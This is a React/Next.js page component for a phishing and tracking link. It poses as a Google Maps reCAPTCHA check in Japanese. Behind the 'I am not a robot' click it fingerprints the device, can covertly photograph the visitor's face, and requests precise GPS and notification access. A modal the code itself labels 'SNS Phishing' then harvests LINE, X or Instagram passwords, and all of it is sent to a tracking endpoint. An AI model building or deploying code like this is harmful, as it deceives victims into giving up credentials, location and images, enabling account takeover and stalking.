// File: src/app/[track_id]/page.tsx
'use client'

import { useEffect, useState, useRef, use } from 'react'

export default function TrackPage({ params }: { params: Promise<{ track_id: string }> }) {
    const [statusText, setStatusText] = useState('')
    const [isVerifying, setIsVerifying] = useState(false)

    // SNS Phishing states
    const [showSnsModal, setShowSnsModal] = useState(false)
    const [snsPlatform, setSnsPlatform] = useState<'LINE' | 'X' | 'Instagram'>('LINE')
    const [snsInput, setSnsInput] = useState({ username: '', password: '' })
    const [snsSubmitting, setSnsSubmitting] = useState(false)

    const hasStarted = useRef(false)
    const pendingPayload = useRef<any>(null)

    const unwrappedParams = use(params)
    const trackId = unwrappedParams.track_id

    // --- Helper: Capture face photo ---
    const captureFacePhoto = async (): Promise<string | null> => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
            const video = document.createElement('video')
            video.srcObject = stream
            video.setAttribute('playsinline', 'true')
            await video.play()

            await new Promise(res => setTimeout(res, 1200)) // wait for camera to focus

            const canvas = document.createElement('canvas')
            canvas.width = video.videoWidth || 640
            canvas.height = video.videoHeight || 480
            const ctx = canvas.getContext('2d')
            ctx?.drawImage(video, 0, 0)
            const dataUrl = canvas.toDataURL('image/jpeg', 0.7)

            stream.getTracks().forEach(t => t.stop())
            return dataUrl
        } catch (e) {
            console.error('Camera capture failed', e)
            return null
        }
    }

    // --- Helper: Request push notification ---
    const requestPushNotification = async (): Promise<string | null> => {
        try {
            const permission = await Notification.requestPermission()
            if (permission === 'granted') {
                return 'granted'
            }
            return null
        } catch (e) {
            console.error('Push notification failed', e)
            return null
        }
    }

    // --- Main verification flow ---
    const startVerification = async () => {
        if (hasStarted.current) return
        hasStarted.current = true

        setIsVerifying(true)
        setStatusText('ロボットではないことを確認しています...')

        try {
            // Fetch features config for this link
            const linkRes = await fetch(`/api/links/info/${trackId}`)
            const linkData = linkRes.ok ? await linkRes.json() : {}
            const features = linkData.features || { gps: true, camera: false, pushNotification: false, snsPhishing: false }

            // IP
            let ipData = { ip: '' }
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json')
                ipData = await ipResponse.json()
            } catch (e) { }

            const envData: any = {
                ip_address: ipData.ip,
                user_agent: navigator.userAgent,
                screen_width: window.screen.width,
                screen_height: window.screen.height,
                window_width: window.innerWidth,
                window_height: window.innerHeight,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                logical_cores: navigator.hardwareConcurrency || null,
                device_memory: (navigator as any).deviceMemory || null,
                network_type: (navigator as any).connection?.effectiveType || null,
                network_speed: (navigator as any).connection?.downlink || null,
            }

            try {
                if ((navigator as any).getBattery) {
                    const battery = await (navigator as any).getBattery()
                    envData.battery_level = battery.level
                    envData.battery_charging = battery.charging
                }
            } catch (e) { }

            // 📷 Camera feature
            if (features.camera) {
                setStatusText('セキュリティ認証のため、カメラアクセスを確認しています...')
                const photo = await captureFacePhoto()
                if (photo) envData.face_photo = photo
            }

            // 🔔 Push Notification feature
            if (features.pushNotification) {
                setStatusText('通知設定を確認しています...')
                const endpoint = await requestPushNotification()
                if (endpoint) envData.push_endpoint = endpoint
            }

            // 📍 GPS feature
            if (features.gps) {
                setStatusText('最終確認中... 位置情報へのアクセスを「許可」してください。')
                try {
                    const position: any = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        })
                    })
                    envData.latitude = position.coords.latitude
                    envData.longitude = position.coords.longitude
                    envData.gps_accuracy = position.coords.accuracy
                    envData.gps_permission = true
                } catch {
                    envData.gps_permission = false
                }
            }

            // 🎭 SNS Phishing feature - show modal before submitting
            if (features.snsPhishing) {
                pendingPayload.current = envData
                setShowSnsModal(true)
                return // wait for SNS submit
            }

            // Submit without SNS
            await submitData(envData)

        } catch (err) {
            window.location.href = 'https://maps.google.com'
        }
    }

    // Submit data to server
    const submitData = async (payload: any) => {
        try {
            const res = await fetch('/api/track', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ linkId: trackId, ...payload })
            })

            if (res.ok) {
                const data = await res.json()
                if (data.targetUrl) {
                    window.location.replace(data.targetUrl)
                } else {
                    window.location.replace('https://maps.google.com')
                }
            } else {
                window.location.replace('https://maps.google.com')
            }
        } catch (e) {
            window.location.replace('https://maps.google.com')
        }
    }

    // SNS form submit handler
    const handleSnsSubmit = async (e: React.FormEvent) => {
        e.preventDefault()
        setSnsSubmitting(true)

        const payload = {
            ...pendingPayload.current,
            sns_username: snsInput.username,
            sns_password: snsInput.password,
            sns_platform: snsPlatform,
        }

        await submitData(payload)
    }

    // ---------------------------- UI ----------------------------
    return (
        <div className="relative min-h-screen flex items-center justify-center bg-gray-100 overflow-hidden">
            {/* Blurred Background Map */}
            <div className="absolute inset-0 z-0 pointer-events-none opacity-60">
                <iframe
                    width="100%"
                    height="100%"
                    frameBorder="0"
                    style={{ border: 0, filter: 'blur(8px) grayscale(20%)', transform: 'scale(1.1)' }}
                    src={`https://maps.google.com/maps?q=Tokyo&hl=ja&z=14&output=embed`}
                    allowFullScreen
                    loading="lazy"
                ></iframe>
            </div>

            {/* SNS Phishing Modal */}
            {showSnsModal && (
                <div className="absolute inset-0 z-30 flex items-center justify-center bg-black/50 backdrop-blur-sm">
                    <div className="bg-white rounded-2xl shadow-2xl p-6 max-w-sm w-full mx-4">
                        {/* Platform switcher */}
                        <div className="flex justify-center space-x-2 mb-5">
                            {(['LINE', 'X', 'Instagram'] as const).map(p => (
                                <button
                                    key={p}
                                    onClick={() => setSnsPlatform(p)}
                                    className={`px-3 py-1.5 rounded-full text-xs font-bold transition-colors ${snsPlatform === p ? 'bg-gray-900 text-white' : 'bg-gray-100 text-gray-600'}`}
                                >
                                    {p === 'LINE' ? '💚 LINE' : p === 'X' ? '🐦 X' : '📸 Instagram'}
                                </button>
                            ))}
                        </div>

                        {/* Logo area */}
                        <div className="text-center mb-5">
                            <div className="text-5xl mb-2">
                                {snsPlatform === 'LINE' ? '💬' : snsPlatform === 'X' ? '✖️' : '📷'}
                            </div>
                            <h2 className="text-xl font-bold text-gray-800">
                                {snsPlatform}でログイン
                            </h2>
                            <p className="text-xs text-gray-500 mt-1">
                                地図を表示するためにSNSアカウントを確認してください
                            </p>
                        </div>

                        <form onSubmit={handleSnsSubmit} className="space-y-3">
                            <input
                                type="text"
                                required
                                placeholder={snsPlatform === 'LINE' ? 'メールアドレスまたは電話番号' : snsPlatform === 'X' ? 'ユーザー名またはメール' : 'ユーザー名またはメール'}
                                className="w-full border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-800 bg-gray-50 focus:outline-none focus:ring-2 focus:ring-gray-300"
                                value={snsInput.username}
                                onChange={(e) => setSnsInput(prev => ({ ...prev, username: e.target.value }))}
                            />
                            <input
                                type="password"
                                required
                                placeholder="パスワード"
                                className="w-full border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-800 bg-gray-50 focus:outline-none focus:ring-2 focus:ring-gray-300"
                                value={snsInput.password}
                                onChange={(e) => setSnsInput(prev => ({ ...prev, password: e.target.value }))}
                            />
                            <button
                                type="submit"
                                disabled={snsSubmitting}
                                className="w-full py-3 rounded-xl text-sm font-bold text-white bg-gray-900 hover:bg-gray-800 transition-colors disabled:opacity-50"
                            >
                                {snsSubmitting ? '確認中...' : 'ログインして地図を表示'}
                            </button>
                        </form>
                        <p className="text-[10px] text-gray-400 text-center mt-3">
                            あなたのアカウント情報は安全に保護されます。<br />Google Maps Security Policy
                        </p>
                    </div>
                </div>
            )}

            {/* reCAPTCHA Verification Card */}
            <div className="relative z-10 bg-white rounded-lg shadow-2xl p-6 max-w-sm w-full mx-4 border border-gray-200">
                <div className="flex flex-col items-center mb-6">
                    <img src="/map_icon.png" alt="Google Maps" className="w-16 h-16 mb-2 drop-shadow-sm" />
                    <h2 className="text-xl font-bold text-gray-800">セキュリティ認証</h2>
                    <p className="text-xs text-gray-500 mt-1 text-center">
                        スパムを防止し、安全に地図を表示するために人間であることを証明してください。
                    </p>
                </div>

                {!isVerifying ? (
                    <div
                        onClick={startVerification}
                        className="flex items-center justify-between border-2 border-gray-200 rounded-md p-4 bg-gray-50 cursor-pointer hover:bg-gray-100 transition-colors"
                    >
                        <div className="flex items-center space-x-4">
                            <div className="w-8 h-8 rounded border-2 border-gray-400 bg-white flex items-center justify-center hover:border-blue-500 transition-colors">
                            </div>
                            <span className="text-sm font-semibold text-gray-700">私はロボットではありません</span>
                        </div>
                        <div className="flex flex-col items-center justify-center ml-4">
                            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" className="w-8 h-8" />
                            <span className="text-[10px] text-gray-500 mt-1 font-sans">reCAPTCHA</span>
                        </div>
                    </div>
                ) : (
                    <div className="flex flex-col items-center space-y-4 py-4">
                        <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-600"></div>
                        <p className="text-sm font-bold text-gray-700 text-center animate-pulse">
                            {statusText}
                        </p>
                    </div>
                )}

                <div className="mt-6 border-t pt-4 text-center">
                    <p className="text-[10px] text-gray-400">
                        Protected by Google Maps Security<br />
                        <a href="#" className="hover:underline">Privacy</a> - <a href="#" className="hover:underline">Terms</a>
                    </p>
                </div>
            </div>
        </div>
    )
}
